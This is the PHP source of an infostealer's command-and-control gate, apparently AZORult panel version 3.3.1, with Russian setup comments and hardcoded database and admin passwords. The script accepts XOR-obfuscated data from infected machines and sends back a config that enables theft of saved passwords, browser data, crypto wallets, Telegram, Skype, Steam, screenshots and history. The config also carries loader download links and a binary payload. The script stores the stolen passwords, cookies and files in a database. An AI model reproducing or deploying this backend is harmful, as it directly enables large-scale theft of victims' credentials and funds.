<?php
// 					!!! ВНИМАНИЕ !!!
// 		Кодировка этого файла UTF-8 без BOM
// 		И после изменения данных она должна остаться такой-же
// 		Для редактирования этого файла не используйте стандартный блокнот windows! Он сбивает кодировку
// 		Используйте редактор файлов в ПУ сервера(cPanel/ISP)
// 		Или используйте Notepad++ ( https://notepad-plus-plus.org/ )
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////

	define('PANELPATH',		".//panel/");		//Путь к админке, изменить только panel, слэши не трогать! Пример: ".//mydir2345/"
	define('DB_HOST',		'localhost'); 		//Сервер базы данных, без необходимости не менять!
	define('DB_USER',		'enestult'); 			//Имя пользователя БД. Заменить root на имя пользователя
	define('DB_PASS',		'dsGs22SDssdds'); 				//Пароль пользователя БД. Вписать между кавычек пароль
	define('DB_NAME',		'azor'); 		//Имя базы данных. Заменить azorult на имя базы
	define('ADMIN_PWD',		'SDcxzds22dsdgg'); 			//Пароль в админку. Заменить 123 на новый пароль



////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////



	define('GET_IP_API', 	false); 
	define('PANELVERSION', 	"3.3.1"); 

	
	
	
	




function getUserIP()
{
	//HTTP_CF_CONNECTING_IP
	$realip  = @$_SERVER['HTTP_X_REAL_IP'];
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['HTTP_X_FORWARDED_FOR'];
	$ip = $remote;
	
	if(filter_var($realip, FILTER_VALIDATE_IP))
    {
        $ip = $realip;
    }
    elseif(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
	
	
}
	
	
function CB_XORm($data, $key, $max){
	$datalen=strlen($data);
	$keylen=strlen($key);
	if ($datalen>=$max) $datalen=$max;
	$j=0;
	for($i=0;$i<$datalen; $i++){
		$data[$i] = chr(ord($data[$i])^ord($key[$j]));
		$j++;
		if($j>($keylen-1)) $j=0;
	}
	return $data;
}


function GetISO($ip)
{
	if(!filter_var($ip, FILTER_VALIDATE_IP)) {
		return "AA";
	}
	include PANELPATH."modules/maxmind/maxmind.php";
	$reader = new Reader(PANELPATH.'modules/maxmind/GeoLite2-Country.mmdb');
	$iso = 'AA';
		
	try {
		$data = $reader->get($ip);
		if(isset($data["represented_country"]["iso_code"])) 
			$iso=$data["represented_country"]["iso_code"];
		
		if(isset($data["registered_country"]["iso_code"])) 
			$iso=$data["registered_country"]["iso_code"];
		
		if(isset($data["country"]["iso_code"])) 
			$iso=$data["country"]["iso_code"];
	} catch (Exception $e) {
		$iso = 'AA';
	};
	
	if (strlen($iso)!=2)
		$iso = "AA";
	$reader->close();
	//unset($reader);
	return $iso;
}



function GetWork($mid){
	include PANELPATH."functions.php";
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die('No connect');
	mysqli_set_charset($link, 'utf8' );
	$query = sprintf("SELECT COUNT(*) FROM reports WHERE reports.m_id='%s'", 
					mysqli_real_escape_string($link, $mid));
	$res = mysqli_query($link, $query) or die('Query error');
	$row = mysqli_fetch_row($res);
	
	$count = $row[0];
	
	mysqli_close($link);
	$repeated_reports = true;
	
	$JSONstr = FileToString(PANELPATH."config.json");
	$obj=json_decode($JSONstr);


	$CFGstr = "";

	$CFGstr .= ($obj->isDouble) ? '+' : '-';
	$CFGstr .= ($obj->isSavedPasswords) ? '+' : '-';
	$CFGstr .= ($obj->isBrowserData) ? '+' : '-';
	$CFGstr .= ($obj->isWallets) ? '+' : '-';
	$CFGstr .= ($obj->isSkype) ? '+' : '-';
	$CFGstr .= ($obj->isTelegram) ? '+' : '-';
	$CFGstr .= ($obj->isSteam) ? '+' : '-';
	$CFGstr .= ($obj->isScreenshot) ? '+' : '-';
	$CFGstr .= ($obj->isDelete) ? '+' : '-';
	$CFGstr .= ($obj->isBrowserHistory) ? '+' : '-';
	$CFGstr .= "\r\n";
	foreach($obj->files as $val){
		$CFGstr .= "F".chr(9);
		$CFGstr .= base64_decode($val->fgName).chr(9);
		$CFGstr .= base64_decode($val->fgPath).chr(9);
		$CFGstr .= base64_decode($val->fgMask).chr(9);
		$CFGstr .= base64_decode($val->fgMaxsize).chr(9);
		$CFGstr .= ($val->fgSubfolders) ? '+' : '-'; $CFGstr .= chr(9);
		$CFGstr .= ($val->fgShortcuts) ? '+' : '-'; $CFGstr .= chr(9);
		
		$tmp = base64_decode($val->fgExceptions);
		$tmp = str_replace("\r\n", "|", $tmp);
		$tmp = str_replace("\n", "|", $tmp);
		$tmp = str_replace("||", "|", $tmp);
		$CFGstr .= $tmp;
		
		$CFGstr .= "\r\n";	
	}
	
	
	foreach($obj->loader as $val){
		$CFGstr .= "L".chr(9);
		$CFGstr .= base64_decode($val->ldLink).chr(9);
		$CFGstr .= ($val->ldHide) ? '+' : '-'; $CFGstr .= chr(9);
		$CFGstr .= base64_decode($val->ldTags);		
		$CFGstr .= "\r\n";	
	}

	
	$get_ip_api = GET_IP_API;
	
	$IP = "127.0.0.1";
	$CO = "AA";
	
	if ($get_ip_api == false){
		$IP = getUserIP();
		$CO = GetISO($IP);
		$CFGstr .= "I".chr(9).$IP.":".$CO."\r\n";
	}
	
	if ($get_ip_api == true){
		$CFGstr .= "I".chr(9)."?".chr(9)."reserved"."\r\n";
	}
	

	$repeated_reports = $obj->isDouble;
	$res = true;
	if(($repeated_reports == false) and ($count>0)) 
		$res=false;
	$ret = "exit";
	
	if($res==true){
		$config = base64_encode($CFGstr);
		$ret = "<c>$config</c>".FileToString(PANELPATH."modules/bin/bin.bin");
	}
	
	return $ret;
};




function ParseReport($data){
	include PANELPATH."functions.php";

	$unical_guid = "353E77DF-928B-4941-A631-512662F0785A3061-4E40-BBC2-3A27F641D32B-54FF-44D7-85F3-D950F519F12F";
	$unical_guid = $unical_guid.$unical_guid;
	
	$ReportData = explode($unical_guid, $data);
	if(count($ReportData)!=5) die;
	$info = $ReportData[0];
	$pwds = $ReportData[1];
	$coks = $ReportData[2];
	$file = $ReportData[3];
	$IPAPI =$ReportData[4];
	

	
	$IP = getUserIP();
	$info = explode('|', $info);
	
	if (count($info) != 12) die;
	
	foreach ($info as $value) {
		if(strlen($value)==0) die;
	}
	
	
	
	
	
	
	$link = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die('No connect');

	mysqli_set_charset($link, 'utf8' );
	

	$isocode = GetISO($IP);
	
	if (@$isocode == "") $isocode = "AA";
	
	
	if (strlen($IPAPI)>1){
		
		$tIP = explode(':', $IPAPI)[0];
		$tCO = explode(':', $IPAPI)[1];
		
		if (strlen($tIP)>1) $IP = $tIP; 
		if (strlen($tCO)>1) $isocode = $tCO; 
	};
	$data="";
	$CO = $isocode;
	

	
	$filename = $isocode."-".date("Y-m-d H-i-s").str_replace(array(".","/","\\"), "",urldecode($info[0]))."-v33.zip"; 
	WriteToFile(PANELPATH."/files/$filename", $file);
	$query = sprintf("INSERT INTO reports (m_id,ip,country,date,time,compname,username,os_name,os_arch,os_ver,files_count, btc_count, cc_count,passwords_count,bin_type,bin_rights,filename) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", 
					mysqli_real_escape_string($link, urldecode($info[0])),
					mysqli_real_escape_string($link, $IP),
					mysqli_real_escape_string($link, $isocode),
					mysqli_real_escape_string($link, date("Y-m-d")),
					mysqli_real_escape_string($link, date("H:i:s")),
					mysqli_real_escape_string($link, iconv("cp1251", "utf-8", urldecode($info[4]))), 
					mysqli_real_escape_string($link, iconv("cp1251", "utf-8", urldecode($info[5]))),   //user
					mysqli_real_escape_string($link, iconv("cp1251", "utf-8", urldecode($info[2]))),
					mysqli_real_escape_string($link, urldecode($info[3])),
					mysqli_real_escape_string($link, urldecode($info[1])),
					
					mysqli_real_escape_string($link, urldecode($info[9])),
					mysqli_real_escape_string($link, urldecode($info[7])),
					mysqli_real_escape_string($link, urldecode($info[8])),
					mysqli_real_escape_string($link, urldecode($info[6])),
					
					mysqli_real_escape_string($link, urldecode($info[10])),
					mysqli_real_escape_string($link, urldecode($info[11])),
					mysqli_real_escape_string($link, $filename));
	
	$res = mysqli_query($link,$query) or die('Query error');
	$r_id= mysqli_insert_id($link);
	
	$pwdlist = explode("\r\n", $pwds);
	
	
	
	$query_st = 'INSERT INTO `passwords` (p_soft_type, p_soft_name,r_id, p_p1, p_p2, p_p3, p_p4) VALUES '; 	
	$query = $query_st;
	$limit = 1;
	$i = 0;
	$str_len_limit = 256;
	foreach ($pwdlist as &$value) {
		$line = explode("|",$value);
		$soft_type	= mysqli_real_escape_string($link, urldecode(@$line[0]));
		$soft_name	= mysqli_real_escape_string($link, urldecode(@$line[1]));
		$p1 		= mysqli_real_escape_string($link, urldecode(@$line[2]));
		$p2			= mysqli_real_escape_string($link, urldecode(@$line[3]));
		$p3			= mysqli_real_escape_string($link, urldecode(@$line[4]));
		$p4			= mysqli_real_escape_string($link, urldecode(@$line[5]));
		
		$p1 = substr($p1,0,$str_len_limit);
		$p2 = substr($p2,0,$str_len_limit);
		$p3 = substr($p3,0,$str_len_limit);
		$p4 = substr($p4,0,$str_len_limit);
		
		if(strlen($soft_type)>0){
			$i++;
			$query .= "('$soft_type', '$soft_name','$r_id', '$p1', '$p2', '$p3', '$p4'),";
			if($i <= $limit){
				$query = substr($query, 0, -1);
				$result = mysqli_query($link, $query);
				$query = $query_st;
				$i = 0;
			}			
		}			
	}
	
	if ($i>0){
		$query = substr($query, 0, -1);
		$result = mysqli_query($link, $query);
	}
	
	
	
	//$result = mysqli_query($link, "INSERT INTO `passwords` (p_soft_type, p_soft_name,r_id, p_p1, p_p2, p_p3, p_p4) VALUES ('$soft_type', '$soft_name','$r_id', '$p1', '$p2', '$p3', '$p4')");
	
	$query = 'INSERT INTO `cookies`(domain, r_id) VALUES ';
	$cookielist = explode("\r\n", $coks);
	foreach ($cookielist as $host) {
		$query .= sprintf("('%s', '$r_id'),", mysqli_real_escape_string($link, urldecode($host)))."\r\n";
		
	}
	$query = substr($query, 0, -3);
	$result = mysqli_query($link, $query);
	mysqli_close($link);
	
	echo 'OK';
		
};



if(basename($_SERVER['PHP_SELF'])=="index.php")
{
	$xorkey = chr(03).chr(85).chr(174);
	$postdata = file_get_contents("php://input");
	$postdata = CB_XORm($postdata, $xorkey, 1024*512);
	
	if(strncmp($xorkey, $postdata, 3)==0){
		$work=GetWork(urldecode(substr($postdata,3)));
		$work=CB_XORm($work, $xorkey, 1024*512);
		echo $work;
	} else 
	{
		ParseReport($postdata);
		die();	
	} 
}	
	
?>